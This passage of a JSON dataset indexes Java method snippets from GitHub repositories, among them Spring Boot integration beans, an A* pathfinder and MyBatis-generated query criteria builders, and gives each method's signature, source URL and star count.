null, "modifiers": ["public"], "return_type": "DirectChannel", "snippet": "\tpublic DirectChannel inputChannel() {\n\t\treturn new DirectChannel();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55761, "method_name": "outputChannel", "class_name": "SampleIntegrationApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DirectChannel", "snippet": "\tpublic DirectChannel outputChannel() {\n\t\treturn new DirectChannel();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55762, "method_name": "fileWriter", "class_name": "SampleIntegrationApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FileWritingMessageHandler", "snippet": "\tpublic FileWritingMessageHandler fileWriter() {\n\t\tFileWritingMessageHandler writer = new FileWritingMessageHandler(this.serviceProperties.getOutputDir());\n\t\twriter.setExpectReply(false);\n\t\treturn writer;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55763, "method_name": "integrationFlow", "class_name": "SampleIntegrationApplication", "params": ["SampleEndpoint"], "throws": null, "modifiers": ["public"], "return_type": "IntegrationFlow", "snippet": "\tpublic IntegrationFlow integrationFlow(SampleEndpoint endpoint) {\n\t\treturn IntegrationFlows.from(fileReader(), new FixedRatePoller()).channel(inputChannel()).handle(endpoint)\n\t\t\t\t.channel(outputChannel()).handle(fileWriter()).get();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55764, "method_name": "main", "class_name": "SampleIntegrationApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SampleIntegrationApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55765, "method_name": "accept", "class_name": "FixedRatePoller", "params": ["SourcePollingChannelAdapterSpec"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void accept(SourcePollingChannelAdapterSpec spec) {\n\t\t\tspec.poller(Pollers.fixedRate(500));\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Consumer"], "modifiers": ["static", "private"]}}, {"id": 55766, "method_name": "setGrid", "class_name": "PathFinder", "params": ["Grid"], "throws": null, "modifiers": ["public"], "return_type": "PathFinder", "snippet": "  public PathFinder setGrid(Grid grid) {\n      this.grid = grid;\n      return this;\n  }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55767, "method_name": "from", "class_name": "PathFinder", "params": ["Coord"], "throws": null, "modifiers": ["public"], "return_type": "PathFinder", "snippet": "  public PathFinder from(Coord Coord) {\n    from = Coord;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55768, "method_name": "to", "class_name": "PathFinder", "params": ["Coord"], "throws": null, "modifiers": ["public"], "return_type": "PathFinder", "snippet": "  public PathFinder to(Coord Coord) {\n    to = Coord;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55769, "method_name": "withWeightFunction", "class_name": "PathFinder", "params": ["Function<Coord,Integer>"], "throws": null, "modifiers": ["public"], "return_type": "PathFinder", "snippet": "  public PathFinder withWeightFunction(Function<Coord, Integer> weightFunction) {\n    this.weightFunction = weightFunction;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55770, "method_name": "findPath", "class_name": "PathFinder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PathFinderResult", "snippet": "  public PathFinderResult findPath() {\n    if (from == null || to == null) {\n      return new PathFinderResult();\n    }\n\n    AStar a = new AStar(grid, from, to, weightFunction);\n    List<PathItem> pathItems = a.find();\n    PathFinderResult pfr = new PathFinderResult();\n\n    if (pathItems.isEmpty()) {\n        pfr.isNearest = true;\n        pathItems = new AStar(grid, from, a.getNearest(), weightFunction).find();\n    }\n\n    pfr.path = pathItems.stream()\n        .map(item -> item.coord)\n        .collect(Collectors.toList());\n    pfr.weightedLength = pathItems.get(pathItems.size() - 1).cumulativeLength;\n    return pfr;\n  }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55771, "method_name": "hasNextCoord", "class_name": "PathFinderResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasNextCoord() {\n      return path.size() > 1;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55772, "method_name": "getNextCoord", "class_name": "PathFinderResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Coord", "snippet": "    public Coord getNextCoord() {\n      return path.get(1);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55773, "method_name": "hasNoPath", "class_name": "PathFinderResult", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasNoPath() {\n      return weightedLength == -1;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/PathFinder.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 55774, "method_name": "createPool", "class_name": "MySql", "params": ["ConnectionParam"], "throws": null, "modifiers": ["public"], "return_type": "AbstractDataBasePool", "snippet": "    public AbstractDataBasePool createPool(ConnectionParam params) {\n        var mySqlPool = MysqlHelper.createPool(params);\n        var pool = MysqlPoolImpl.create(mySqlPool);\n        pool.setConnectionParam(params);\n        //\u786e\u4fdd\u94fe\u63a5\u53ef\u7528\u540e\u5728\u52a0\u5165\u7f13\u5b58\u4e4b\u4e2d\n        pool.getDql().heartBeatQuery()\n                .onSuccess(r -> pools.put(params.getUuid(), pool));\n        return pool;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/MySql.java", "stars": "18", "class_props": {"extends": "AbstractDatabaseSource", "implements": null, "modifiers": ["public"]}}, {"id": 55775, "method_name": "close", "class_name": "MySql", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close(String uuid) {\n        var pool = pools.get(uuid);\n        if (Objects.nonNull(pool)) {\n            pool.close();\n        }\n        //\u79fb\u51fa\u6570\u636e\u5e93\u8fde\u63a5\u7f13\u5b58\n        pools.remove(uuid);\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/MySql.java", "stars": "18", "class_props": {"extends": "AbstractDatabaseSource", "implements": null, "modifiers": ["public"]}}, {"id": 55776, "method_name": "closeAll", "class_name": "MySql", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeAll() {\n        pools.forEach((key, pool) -> {\n            pool.close();\n        });\n        //\u6e05\u7a7a\u6570\u636e\u5e93\u7f13\u5b58\n        pools.clear();\n        //\u5173\u95ed\u5b9a\u65f6\u5668\n        if (timerId != null) {\n            VertexUtils.getVertex().cancelTimer(timerId);\n        }\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/MySql.java", "stars": "18", "class_props": {"extends": "AbstractDatabaseSource", "implements": null, "modifiers": ["public"]}}, {"id": 55777, "method_name": "heartBeat", "class_name": "MySql", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void heartBeat() {\n        //\u6bcf\u969410s\u5411mysql\u670d\u52a1\u5668\u53d1\u9001\u4e00\u6b21sql\u67e5\u8be2\u8bed\u53e5\n        VertexUtils.getVertex().setPeriodic(20000, timer -> {\n            pools.forEach((a, b) -> {\n                var future = b.getDql().heartBeatQuery();\n                var serverName = b.getConnectionParam().getName();\n                var host = b.getConnectionParam().getHost();\n                var target = serverName + \"<\" + host + \">\";\n                future.onFailure(t -> {\n                    LOGGER.error(\"failed heart beat to {} server cause:{}\", target, t.getMessage());\n                });\n            });\n        });\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/MySql.java", "stars": "18", "class_props": {"extends": "AbstractDatabaseSource", "implements": null, "modifiers": ["public"]}}, {"id": 55778, "method_name": "setOrderByClause", "class_name": "ItemDOExample", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderByClause(String orderByClause) {\n        this.orderByClause = orderByClause;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55779, "method_name": "getOrderByClause", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrderByClause() {\n        return orderByClause;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55780, "method_name": "setDistinct", "class_name": "ItemDOExample", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDistinct(boolean distinct) {\n        this.distinct = distinct;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55781, "method_name": "isDistinct", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDistinct() {\n        return distinct;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55782, "method_name": "getOredCriteria", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criteria>", "snippet": "    public List<Criteria> getOredCriteria() {\n        return oredCriteria;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55783, "method_name": "or", "class_name": "ItemDOExample", "params": ["Criteria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void or(Criteria criteria) {\n        oredCriteria.add(criteria);\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55784, "method_name": "or", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria or() {\n        Criteria criteria = createCriteriaInternal();\n        oredCriteria.add(criteria);\n        return criteria;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55785, "method_name": "createCriteria", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria createCriteria() {\n        Criteria criteria = createCriteriaInternal();\n        if (oredCriteria.size() == 0) {\n            oredCriteria.add(criteria);\n        }\n        return criteria;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55786, "method_name": "createCriteriaInternal", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Criteria", "snippet": "    protected Criteria createCriteriaInternal() {\n        Criteria criteria = new Criteria();\n        return criteria;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55787, "method_name": "clear", "class_name": "ItemDOExample", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {\n        oredCriteria.clear();\n        orderByClause = null;\n        distinct = false;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55788, "method_name": "isValid", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isValid() {\n            return criteria.size() > 0;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55789, "method_name": "getAllCriteria", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getAllCriteria() {\n            return criteria;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55790, "method_name": "getCriteria", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getCriteria() {\n            return criteria;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55791, "method_name": "addCriterion", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition) {\n            if (condition == null) {\n                throw new RuntimeException(\"Value for condition cannot be null\");\n            }\n            criteria.add(new Criterion(condition));\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55792, "method_name": "addCriterion", "class_name": "GeneratedCriteria", "params": ["String", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value, String property) {\n            if (value == null) {\n                throw new RuntimeException(\"Value for \" + property + \" cannot be null\");\n            }\n            criteria.add(new Criterion(condition, value));\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55793, "method_name": "addCriterion", "class_name": "GeneratedCriteria", "params": ["String", "Object", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value1, Object value2, String property) {\n            if (value1 == null || value2 == null) {\n                throw new RuntimeException(\"Between values for \" + property + \" cannot be null\");\n            }\n            criteria.add(new Criterion(condition, value1, value2));\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55794, "method_name": "andIdIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNull() {\n            addCriterion(\"id is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55795, "method_name": "andIdIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNotNull() {\n            addCriterion(\"id is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55796, "method_name": "andIdEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdEqualTo(Integer value) {\n            addCriterion(\"id =\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55797, "method_name": "andIdNotEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotEqualTo(Integer value) {\n            addCriterion(\"id <>\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55798, "method_name": "andIdGreaterThan", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThan(Integer value) {\n            addCriterion(\"id >\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55799, "method_name": "andIdGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThanOrEqualTo(Integer value) {\n            addCriterion(\"id >=\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55800, "method_name": "andIdLessThan", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThan(Integer value) {\n            addCriterion(\"id <\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55801, "method_name": "andIdLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThanOrEqualTo(Integer value) {\n            addCriterion(\"id <=\", value, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55802, "method_name": "andIdIn", "class_name": "GeneratedCriteria", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIn(List<Integer> values) {\n            addCriterion(\"id in\", values, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55803, "method_name": "andIdNotIn", "class_name": "GeneratedCriteria", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotIn(List<Integer> values) {\n            addCriterion(\"id not in\", values, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55804, "method_name": "andIdBetween", "class_name": "GeneratedCriteria", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdBetween(Integer value1, Integer value2) {\n            addCriterion(\"id between\", value1, value2, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55805, "method_name": "andIdNotBetween", "class_name": "GeneratedCriteria", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotBetween(Integer value1, Integer value2) {\n            addCriterion(\"id not between\", value1, value2, \"id\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55806, "method_name": "andTitleIsNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleIsNull() {\n            addCriterion(\"title is null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55807, "method_name": "andTitleIsNotNull", "class_name": "GeneratedCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleIsNotNull() {\n            addCriterion(\"title is not null\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55808, "method_name": "andTitleEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleEqualTo(String value) {\n            addCriterion(\"title =\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55809, "method_name": "andTitleNotEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleNotEqualTo(String value) {\n            addCriterion(\"title <>\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55810, "method_name": "andTitleGreaterThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleGreaterThan(String value) {\n            addCriterion(\"title >\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55811, "method_name": "andTitleGreaterThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleGreaterThanOrEqualTo(String value) {\n            addCriterion(\"title >=\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55812, "method_name": "andTitleLessThan", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleLessThan(String value) {\n            addCriterion(\"title <\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55813, "method_name": "andTitleLessThanOrEqualTo", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleLessThanOrEqualTo(String value) {\n            addCriterion(\"title <=\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55814, "method_name": "andTitleLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleLike(String value) {\n            addCriterion(\"title like\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55815, "method_name": "andTitleNotLike", "class_name": "GeneratedCriteria", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleNotLike(String value) {\n            addCriterion(\"title not like\", value, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55816, "method_name": "andTitleIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleIn(List<String> values) {\n            addCriterion(\"title in\", values, \"title\");\n            return (Criteria) this;\n        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/ItemDOExample.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["protected", "static", "abstract"]}}, {"id": 55817, "method_name": "andTitleNotIn", "class_name": "GeneratedCriteria", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andTitleNotIn(List<String> values) {\n            addCriterion(\"title not in\", values, \"title\");\n            return (Criteria) this;\n        